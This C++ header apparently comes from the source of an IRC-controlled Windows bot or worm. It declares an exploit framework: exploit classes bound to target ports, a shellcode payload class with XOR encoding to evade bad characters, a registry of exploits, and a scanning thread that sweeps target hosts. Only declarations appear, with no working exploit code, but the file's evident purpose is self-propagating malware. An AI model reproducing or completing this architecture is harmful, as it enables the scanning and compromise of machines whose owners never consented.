#pragma once

#include <windows.h>
#include "thread.h"
#include "target.h"
#include "socketwrapper.h"
#include "irc.h"
#include "thread.h"
#include "mutex.h"

// Exploit class relies on outside caller to create socket 

class Exploit : public Thread
{
public:
	VOID Run(Socket & Socket);
	PCHAR GetName(VOID);
	USHORT GetAffectedPort(VOID);

protected:
	Exploit(PCHAR Name, USHORT Port);
	virtual VOID ExploitTarget(VOID) = 0;
	Socket GetInitialSocket(VOID);

private:
	VOID ThreadFunc(VOID);

	Socket Socket;
	CHAR Name[64];
	USHORT AffectedPort;
};

class Payload
{
public:
	Payload();
	~Payload();
	PCHAR GetShellcode(VOID);
	UINT GetShellcodeSize(VOID);
	VOID Xor(PCHAR BadChars, UINT BadCharsSize);

protected:
	PCHAR AllocateShellcode(UINT Size);

private:
	PCHAR Shellcode;
	UINT ShellcodeSize;
};

class Exploits
{
public:
	Exploits();
	~Exploits();
	VOID Run(Socket & Socket);
	USHORT GetAffectedPort(VOID);
	VOID SetExploit(PCHAR Name);
	Exploit* GetExploit(VOID);
	VOID SetPayload(Payload* Payload);
	Payload* GetPayload(VOID);
	Mutex Mutex;

private:
	VOID Register(Exploit* Exploit);
	VOID RemovePayload(VOID);

	std::vector<Exploit*> ExploitsList;
	Payload* Payload;
	Exploit* Exploit;
};

extern Exploits Exploits;

class ScanThread : public Thread
{
public:
	ScanThread(UINT Interval);
	VOID AddTarget(PCHAR Host);
	VOID ClearTargets(VOID);
	VOID SetInterval(UINT Interval);
	VOID Pause(VOID);
	VOID Resume(VOID);
	ULONG GetCurrentAddr(VOID);
	USHORT GetCurrentPort(VOID);

protected:
	class ScanQueue : public ServeQueue
	{
	public:
		ScanQueue() : ServeQueue(0) { };
		BOOL OnEvent(WSANETWORKEVENTS NetEvents);
	};

private:
	VOID ThreadFunc(VOID);
	HANDLE Event;
	UINT Interval;
	ULONG CurrentAddr;
	USHORT CurrentPort;
	Mutex Mutex;
	ServeQueueList<ScanQueue> ScanQueueList;
	std::vector<Target> TargetList;
};